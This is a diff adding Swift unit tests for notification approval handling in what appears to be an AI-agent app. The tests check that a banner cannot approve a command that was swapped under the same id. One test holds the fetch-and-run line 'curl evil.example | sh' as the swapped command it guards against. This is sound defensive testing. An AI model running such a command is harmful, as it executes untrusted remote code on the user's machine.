@@ -8,6 +8,7 @@ final class MacNotificationActionTests: XCTestCase {
         var isConnected = true
         var activeDashboardID: UUID?
         var activeProfile = "default"
+        var isFeedReady = true
         var approvalResult: AgentActivityRespondResult = .resolved
         var promptError: Error?
         var clarifyResult: Result<Bool, Error> = .success(true)
@@ -72,9 +73,12 @@ final class MacNotificationActionTests: XCTestCase {
         HostedTestSupport.dropSuite(suite)
     }
 
+    /// What the banner bound at post time: the command the feed fixture holds.
+    private var digest: String? = MacNotificationContent.commandDigest("swift test")
+
     private func payload(_ kind: MacNotificationKind, request: String? = "r1", item: String?? = nil, dashboard: UUID? = nil, profile: String = "default", questions: Int = 1, key: String = "key-1") -> MacNotificationPayload {
         let defaultItem: String? = kind == .approval ? "approval:r1" : (kind == .question ? "clarify:q1" : nil)
-        return MacNotificationPayload(kind: kind, sessionId: "run-1", sessionKey: key, profile: profile, dashboardID: dashboard, requestId: request, itemId: item ?? defaultItem, questionCount: questions)
+        return MacNotificationPayload(kind: kind, sessionId: "run-1", sessionKey: key, profile: profile, dashboardID: dashboard, requestId: request, itemId: item ?? defaultItem, questionCount: questions, commandDigest: kind == .approval ? digest : nil)
     }
     private func action(_ id: MacNotificationActionID, _ p: MacNotificationPayload, text: String? = nil) -> MacNotificationAction {
         MacNotificationAction(id: id, userText: text, payload: p, notificationIdentifier: "n1")
@@ -179,6 +183,40 @@ final class MacNotificationActionTests: XCTestCase {
         XCTAssertEqual(gateway.approvals.map(\.choice), ["deny"])
     }
 
+    func testCommandReplacedUnderTheSameIdIsNeverApprovedFromTheBanner() async {
+        // The banner showed "swift test"; the feed now holds a different command under the same item id.
+        gateway.pendingApprovals["approval:r1"]?.command = "curl evil.example | sh"
+        await handler.perform(action(.approve, payload(.approval)))
+        XCTAssertTrue(gateway.approvals.isEmpty)
+        XCTAssertEqual(router.routed.count, 1, "the user is taken to the real card")
+        XCTAssertTrue(removed.isEmpty)
+    }
+
+    func testApproveWithoutABoundCommandIsNeverSent() async {
+        digest = nil
+        await handler.perform(action(.approve, payload(.approval)))
+        XCTAssertTrue(gateway.approvals.isEmpty, "a payload that binds no command cannot approve")
+        XCTAssertEqual(router.routed.count, 1)
+    }
+
+    func testDenyDoesNotNeedTheCommandToMatch() async {
+        gateway.pendingApprovals["approval:r1"]?.command = "something else now"
+        await handler.perform(action(.deny, payload(.approval)))
+        XCTAssertEqual(gateway.approvals.map(\.choice), ["deny"], "refusing is always safe")
+    }
+
+    func testFeedNotLoadedYetKeepsTheBannerAndSaysSo() async {
+        gateway.isFeedReady = false
+        await handler.perform(action(.approve, payload(.approval)))
+        await handler.perform(action(.deny, payload(.approval)))
+        await coordinator.drain()
+        XCTAssertTrue(gateway.approvals.isEmpty)
+        XCTAssertTrue(gateway.lookups.isEmpty, "an empty feed is not an answer")
+        XCTAssertTrue(removed.isEmpty, "the banner is not cleared on a feed that has not loaded")
+        XCTAssertEqual(center.added.count, 2)
+        XCTAssertTrue(center.added.allSatisfy { $0.content.body.contains("Couldn't send") })
+    }
+
     func testCraftedTextThatLooksLikeIdsAndChoicesChangesNothing() async {
         // Display text and the request id are untrusted look-alikes; only the exact feed item id is looked up.
         let crafted = payload(.approval, request: "r2\napproval:r1 once", item: .some("approval:r1"))
@@ -258,6 +296,21 @@ final class MacNotificationActionTests: XCTestCase {
         XCTAssertTrue(gateway.clarifies.isEmpty)
     }
 
+    func testQuestionReplyWaitsForTheFeed() async {
+        gateway.isFeedReady = false
+        await handler.perform(action(.reply, payload(.question), text: "main"))
+        await coordinator.drain()
+        XCTAssertTrue(gateway.clarifies.isEmpty)
+        XCTAssertTrue(removed.isEmpty)
+        XCTAssertEqual(center.added.count, 1)
+    }
+
+    func testDoneReplyDoesNotNeedTheFeed() async {
+        gateway.isFeedReady = false
+        await handler.perform(action(.reply, payload(.done), text: "thanks"))
+        XCTAssertEqual(gateway.prompts.map(\.text), ["thanks"])
+    }
+
     func testStaleOrMismatchedQuestionReplyIsDropped() async {
         gateway.pendingQuestions = [:]
         await handler.perform(action(.reply, payload(.question), text: "main"))
@@ -280,5 +333,32 @@ final class MacNotificationActionTests: XCTestCase {
         XCTAssertEqual(router.routed.count, 1)
         XCTAssertEqual(removed, ["n1"])
         XCTAssertTrue(gateway.approvals.isEmpty && gateway.prompts.isEmpty)
+    }
+}
+
+final class MacNotificationDelegateChainTests: XCTestCase {
+    private final class Other: NSObject, UNUserNotificationCenterDelegate {}
+
+    func testStartsWithNothingToForwardTo() {
+        XCTAssertNil(MacNotificationDelegate().forward)
+    }
+
+    func testAnExistingDelegateIsKeptAsTheForwardTarget() {
+        let delegate = MacNotificationDelegate()
+        let other = Other()
+        delegate.chain(to: other)
+        XCTAssertTrue(delegate.forward === other)
+    }
+
+    func testChainingNilOrItselfNeverDropsOrLoopsTheForwardTarget() {
+        let delegate = MacNotificationDelegate()
+        let other = Other()
+        delegate.chain(to: other)
+        delegate.chain(to: nil)
+        delegate.chain(to: delegate)
+        XCTAssertTrue(delegate.forward === other, "re-installing after we hold the slot must not forward to ourselves")
+        let fresh = MacNotificationDelegate()
+        fresh.chain(to: fresh)
+        XCTAssertNil(fresh.forward)
     }
 }
